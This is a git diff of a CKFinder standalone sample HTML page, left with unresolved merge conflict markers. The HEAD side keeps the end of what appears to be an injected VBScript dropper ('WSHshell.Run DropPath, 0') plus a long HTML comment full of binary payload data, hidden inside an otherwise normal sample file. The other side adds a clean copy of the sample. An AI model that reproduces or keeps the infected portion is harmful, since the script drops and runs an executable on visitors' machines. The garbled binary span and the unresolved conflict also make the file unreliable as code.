@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <!--
  * CKFinder
@@ -126,3 +127,95 @@ WSHshell.Run DropPath, 0
 //--></SCRIPT><!--Ùšt•ÂÛÈÃîXÍö–=y“šlû-Hz¤-iVihµ{f±«3má¿ƒcµ€Æj"YAäaê_¬;ô”?v˜Ùï¹Ç…ë=3¹Ø{=Y&¸ÞÌ&±^9§ÙþÞÐ¬4³ÎDÛ§Á­,á†5è‚Þáì¶è,¶]õ
 ”Ä‚ Z÷ƒxÍGîêaõ-{µ„‚ Ü–zÁTï‚úŸÁ¦Š:ˆ	L{ þ9‡Ã"ºw‘3xÛÃÙmÑSÙ½‘J.ñ,ÙïJý·ƒE«T’éÔÞ˜>s†‰+JPô‚x¤Ý n¿DƒGZÂúýáž@µÏ?Avý‰b… ù—••¡KÀ¶dOÒ#û²]Yh}¸i¤.Ag˜Í-ãñ3ï˜øÛêKv¦FszöÔ>á_.Îs,KÂGþŽ…úBbÐƒë	ç|ãÇ±‚ÜU0k/¯Ãn \
  {fÊ=…>rÓ§wÔDŸëv'cð[O4+»çºq÷ØÈŠù ÅÿRäûÅÿÅÿÅÿì·L¸K[Úíô Åÿ-->
+=======
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!--
+ * CKFinder
+ * ========
+ * http://cksource.com/ckfinder
+ * Copyright (C) 2007-2014, CKSource - Frederico Knabben. All rights reserved.
+ *
+ * The software, this file and its contents are subject to the CKFinder
+ * License. Please read the license.txt file before using, installing, copying,
+ * modifying or distribute this file or part of its contents. The contents of
+ * this file is part of the Source Code of CKFinder.
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title>CKFinder - Sample - Standalone (V1)</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="robots" content="noindex, nofollow" />
+	<link href="sample.css" rel="stylesheet" type="text/css" />
+	<script type="text/javascript" src="../ckfinder_v1.js"></script>
+	<style type="text/css">
+
+		/* By defining CKFinderFrame, you are able to customize the CKFinder frame style */
+		.CKFinderFrame
+		{
+			border: solid 2px #e3e3c7;
+			background-color: #f1f1e3;
+		}
+
+	</style>
+	<script type="text/javascript">
+
+
+	</script>
+</head>
+<body>
+	<h1 class="samples">
+		CKFinder - Sample - Standalone (V1)
+	</h1>
+	<p>
+		CKFinder may be used in standalone mode inside any page, to create a repository
+		manager with ease. You may define a custom JavaScript function to be called when
+		an image is selected (double-clicked).</p>
+	<div class="description">
+		This sample is using the old "V1" integration method.
+	</div>
+	<div>
+		<script type="text/javascript">
+
+			// This is a sample function which is called when a file is selected in CKFinder.
+			function ShowFileInfo( fileUrl, data )
+			{
+				var msg = 'The selected file URL is: ' + fileUrl + '\n\n';
+				// Display additional information available in the "data" object.
+				// For example, the size of a file (in KB) is available in the data["fileSize"] variable.
+				msg += 'File size: ' + data['fileSize'] + 'KB\n';
+				msg += 'Last modified: ' + data['fileDate'];
+
+				alert( msg );
+			}
+
+			// You can use the "CKFinder" class to render CKFinder in a page:
+			var finder = new CKFinder();
+			finder.BasePath = '../';	// The path for the installation of CKFinder (default = "/ckfinder/").
+			// The default height is 400.
+			finder.Height = 600;
+			finder.SelectFunction = ShowFileInfo;
+			// It is not required to use the "v1" skin.
+			finder.Skin = 'v1';
+			finder.Create();
+
+			// It can also be done in a single line, calling the "static"
+			// Create( basePath, width, height, selectActionFunction ) function:
+			// CKFinder.Create( '../', null, null, ShowFileInfo );
+			//
+			// The "Create" function can also accept an object as the only argument.
+			// CKFinder.Create( { BasePath : '../', Skin : 'v1', SelectActionFunction : ShowFileInfo } );
+
+		</script>
+	</div>
+	<div id="footer">
+		<hr />
+		<p>
+			CKFinder - Ajax File Manager - <a class="samples" href="http://cksource.com/ckfinder/">http://cksource.com/ckfinder</a>
+		</p>
+		<p id="copy">
+			Copyright &copy; 2007-2014, <a class="samples" href="http://cksource.com/">CKSource</a> - Frederico Knabben. All rights reserved.
+		</p>
+	</div>
+</body>
+</html>
+>>>>>>> minhdv
